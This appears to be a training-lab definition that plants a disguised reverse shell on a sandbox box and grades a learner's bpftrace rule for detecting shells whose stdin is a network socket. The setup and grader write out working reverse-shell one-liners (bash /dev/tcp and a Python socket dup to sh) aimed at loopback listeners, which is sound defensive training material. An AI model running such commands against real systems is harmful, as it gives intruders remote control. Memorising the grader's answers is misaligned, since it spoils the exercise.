---
kind: lesson
title: "a shell is talking to a socket"
description: |
  Someone has a shell on this box whose input comes from a TCP connection: a
  reverse shell. Alerting on every exec of sh is the first idea and it is
  useless here — cron runs sh every minute and every SSH login starts a shell.
  The difference is what the shell's stdin is. The work is finding the one
  already running, then writing the bpftrace rule that would have caught it
  starting, and stays quiet for everything else.
name: detect-a-reverse-shell
slug: detect-a-reverse-shell
createdAt: "2026-11-23"

sandbox:
  stack: linux-box
  service: box

tasks:
  init_scenario:
    init: true
    timeout_seconds: 180
    run: |
      set -e

      # ---- clean slate ---------------------------------------------------
      for u in fc-cache-refresh c2-listener; do
        systemctl stop "$u.service" 2>/dev/null || true
        systemctl reset-failed "$u.service" 2>/dev/null || true
      done
      rm -f /etc/cron.d/logship /usr/local/bin/logship /root/revshell.bt \
            /root/answers/revshell.md /var/lib/devopslings/revshell.pid
      install -d /root/answers /var/lib/devopslings /var/log/logship
      mountpoint -q /sys/kernel/tracing || mount -t tracefs tracefs /sys/kernel/tracing

      # ---- the noise: cron shells out every minute ---------------------------
      cat > /usr/local/bin/logship <<'SH'
      #!/bin/sh
      ls /var/log/logship | wc -l > /var/log/logship/.count
      SH
      chmod 0755 /usr/local/bin/logship
      echo '* * * * * root /bin/sh -c /usr/local/bin/logship' > /etc/cron.d/logship
      systemctl enable --now cron.service >/dev/null 2>&1

      # ---- the intruder ------------------------------------------------------
      # The "attacker" end listens on loopback and holds the connection open; the
      # shell runs under a unit named to look like housekeeping.
      port=$(python3 -c 'import random; print(random.randint(20000, 40000))')
      systemd-run --quiet --unit=c2-listener python3 -c "
      import socket, time
      s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      s.bind(('127.0.0.1', $port)); s.listen(1)
      c, _ = s.accept()
      while True:
          time.sleep(3600)
      "
      sleep 1
      systemd-run --quiet --unit=fc-cache-refresh \
        bash -c "bash -i >& /dev/tcp/127.0.0.1/$port 0>&1"
      pid=""
      for _ in $(seq 40); do
        pid=$(pgrep -x -f 'bash -i' || true)
        [ -n "$pid" ] && break
        sleep 0.25
      done
      [ -n "$pid" ]
      echo "$pid $port" > /var/lib/devopslings/revshell.pid
      chmod 0600 /var/lib/devopslings/revshell.pid

      cat > /root/questions.txt <<'Q'
      Someone has a shell on this box whose stdin is a TCP connection.

      1. Find it. Write /root/answers/revshell.md:
           pid: <the shell's PID>
           peer: <the address:port its socket is connected to>

      2. Write /root/revshell.bt, a bpftrace program that prints a line when a
         shell starts with a network socket as its stdin, and prints nothing for
         anything else. The grader runs it while it starts reverse shells, runs
         the cron job's shell, and logs in over SSH with and without a terminal.
      Q

      echo "scenario ready — a reverse shell is running somewhere on this box"

  verify_done:
    needs: [init_scenario]
    timeout_seconds: 240
    run: |
      set -e
      ans=/root/answers/revshell.md
      w=/root/revshell.bt
      mountpoint -q /sys/kernel/tracing || mount -t tracefs tracefs /sys/kernel/tracing
      read -r rpid rport < /var/lib/devopslings/revshell.pid

      # ---- the running shell ---------------------------------------------
      if [ ! -s "$ans" ]; then
        echo "not yet: $ans is missing or empty:  pid: <n>  peer: <addr:port>"
        exit 1
      fi
      low=$(tr 'A-Z' 'a-z' < "$ans")
      field() { printf '%s\n' "$low" | sed -n "s/^[[:space:]]*$1[[:space:]]*[:=][[:space:]]*//p" | head -n 1; }
      if ! printf '%s' "$(field pid)" | grep -Eq "\\b$rpid\\b"; then
        echo "not yet: pid says '$(field pid)', and that is not the shell reading from"
        echo "         a socket. ls -l /proc/<pid>/fd/0 on each shell says what its"
        echo "         stdin is; ss -tp says which process holds which connection."
        exit 1
      fi
      if ! printf '%s' "$(field peer)" | grep -Eq "(127\\.0\\.0\\.1|localhost):$rport\\b"; then
        echo "not yet: peer says '$(field peer)'. Give the remote end of the shell's"
        echo "         connection as address:port — ss -tnp shows both ends."
        exit 1
      fi

      # ---- the rule ------------------------------------------------------
      if [ ! -s "$w" ]; then
        echo "not yet: $w is missing or empty."
        exit 1
      fi
      cleanup() {
        [ -n "${bt:-}" ] && kill -INT "$bt" 2>/dev/null || true
        [ -n "${lst:-}" ] && kill "$lst" 2>/dev/null || true
        systemctl stop ssh.service 2>/dev/null || true
        rm -f "${out:-/nonexistent}"
      }
      trap cleanup EXIT

      # SSH: a user with a key, the daemon up for the length of the check.
      id probe-ops >/dev/null 2>&1 || useradd -m -s /bin/bash probe-ops
      install -d -m 0700 -o probe-ops -g probe-ops /home/probe-ops/.ssh
      [ -f /root/.ssh/probe_ed25519 ] || { install -d -m 0700 /root/.ssh; ssh-keygen -q -t ed25519 -N '' -f /root/.ssh/probe_ed25519; }
      install -m 0600 -o probe-ops -g probe-ops /root/.ssh/probe_ed25519.pub /home/probe-ops/.ssh/authorized_keys
      ssh-keygen -A >/dev/null
      systemd-tmpfiles --create /etc/tmpfiles.d/sshd.conf
      # The box's boot never removes /run/nologin, and pam_nologin refuses every
      # non-root login while it exists.
      systemctl start systemd-user-sessions.service >/dev/null 2>&1 || true
      rm -f /run/nologin
      systemctl start ssh.service
      sshp() { ssh -i /root/.ssh/probe_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o LogLevel=ERROR "$@"; }
      for _ in $(seq 20); do sshp probe-ops@127.0.0.1 true >/dev/null 2>&1 && break; sleep 0.5; done
      if ! err=$(sshp probe-ops@127.0.0.1 true 2>&1 < /dev/null); then
        echo "not yet: the grader could not log in over SSH as probe-ops, so it cannot"
        echo "         check the SSH case. ssh said:"
        printf '%s\n' "$err" | tail -n 4 | sed 's/^/         /'
        exit 1
      fi

      out=$(mktemp)
      bpftrace "$w" > "$out" 2>&1 &
      bt=$!
      for _ in $(seq 120); do
        grep -q '^Attaching' "$out" && break
        kill -0 "$bt" 2>/dev/null || break
        sleep 0.5
      done
      if ! kill -0 "$bt" 2>/dev/null; then
        echo "not yet: bpftrace stopped running $w. Its output:"
        tail -n 8 "$out" | sed 's/^/         /'
        exit 1
      fi
      sleep 1
      lines() { grep -vcE '^(Attaching|$)' "$out" || true; }
      new_since() { sleep 1; echo $(( $(lines) - $1 )); }
      cpu0_note() {
        grep -q 'syscalls:sys_enter_' "$w" || return 0
        echo "         If you are sure the rule is right: on some kernels the"
        echo "         per-syscall sys_enter_* tracepoints reach bpftrace only for"
        echo "         syscalls made on CPU 0. sched:sched_process_exec fires on"
        echo "         every CPU."
      }

      # ---- quiet: cron's shell, run the way cron runs it ------------------
      n=$(lines)
      for _ in 1 2 3; do /bin/sh -c /usr/local/bin/logship < /dev/null; done
      echo | /bin/sh -c /usr/local/bin/logship
      if [ "$(new_since "$n")" -gt 0 ]; then
        echo "not yet: your rule fired on the cron job's shell — sh -c started from a"
        echo "         pipe and /dev/null. It fires every minute on this box. A shell"
        echo "         starting is not the signal; what its stdin is, is."
        exit 1
      fi

      # ---- quiet: interactive shells on a pipe and on /dev/null ------------
      n=$(lines)
      echo exit | timeout 5 bash -i > /dev/null 2>&1 || true
      timeout 5 sh -i < /dev/null > /dev/null 2>&1 || true
      if [ "$(new_since "$n")" -gt 0 ]; then
        echo "not yet: your rule fired on bash -i reading a pipe and sh -i reading"
        echo "         /dev/null. -i is how an operator asks for a prompt; it says"
        echo "         nothing about where the shell's input comes from. Look at fd 0."
        exit 1
      fi

      # ---- quiet: SSH logins, with and without a terminal ------------------
      n=$(lines)
      sshp -T probe-ops@127.0.0.1 'id >/dev/null' < /dev/null || true
      sshp -tt probe-ops@127.0.0.1 'exit' < /dev/null > /dev/null 2>&1 || true
      if [ "$(new_since "$n")" -gt 0 ]; then
        echo "not yet: your rule fired on an SSH login:"
        tail -n 2 "$out" | sed 's/^/         /'
        echo "         sshd-session and sshd-auth start with the client's TCP socket"
        echo "         as their stdin. Check that the program starting is a shell."
        exit 1
      fi

      # ---- quiet: a shell whose stdin is a unix socket ----------------------
      # Socket-activated services and local supervisors hand a child an
      # AF_UNIX socket; it is not a network peer.
      n=$(lines)
      python3 -c "
      import os, socket
      a, b = socket.socketpair()
      if os.fork() == 0:
          os.dup2(b.fileno(), 0)
          os.execv('/bin/sh', ['sh', '-c', '/usr/local/bin/logship'])
      os.wait()
      "
      if [ "$(new_since "$n")" -gt 0 ]; then
        echo "not yet: your rule fired on sh started with a unix socket as stdin, the"
        echo "         way a socket-activated service or a local supervisor starts one."
        echo "         That socket never leaves the box. Check the socket's family:"
        echo "         AF_INET (2) and AF_INET6 (10) are the network."
        exit 1
      fi

      # ---- loud: two reverse shells ----------------------------------------
      lp=$(python3 -c 'import random; print(random.randint(40001, 50000))')
      python3 -c "
      import socket, time
      s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      s.bind(('127.0.0.1', $lp)); s.listen(4)
      for _ in range(2):
          c, _ = s.accept(); c.sendall(b'exit\n'); time.sleep(0.5); c.close()
      " &
      lst=$!
      sleep 0.5
      n=$(lines)
      timeout 5 bash -c "bash -i >& /dev/tcp/127.0.0.1/$lp 0>&1" 2>/dev/null || true
      if [ "$(new_since "$n")" -lt 1 ]; then
        echo "not yet: the grader started bash -i with its stdin on a TCP connection"
        echo "         (bash -i >& /dev/tcp/host/port 0>&1) and your rule printed"
        echo "         nothing."
        cpu0_note
        exit 1
      fi
      n=$(lines)
      timeout 5 python3 -c "
      import os, socket
      s = socket.create_connection(('127.0.0.1', $lp))
      for fd in (0, 1, 2):
          os.dup2(s.fileno(), fd)
      os.execv('/bin/sh', ['sh'])
      " 2>/dev/null || true
      if [ "$(new_since "$n")" -lt 1 ]; then
        echo "not yet: the grader started a plain sh (no -i) from python with a TCP"
        echo "         socket dup'ed onto fd 0, and your rule printed nothing. Reverse"
        echo "         shells do not need -i; the network socket on stdin is the signal."
        cpu0_note
        exit 1
      fi

      echo "PASS — the rule caught both reverse shells, and stayed quiet for cron"
      echo "       for SSH logins with and without a terminal, and for a shell on a"
      echo "       unix socket,"
      echo "       and for interactive shells reading a pipe or /dev/null."
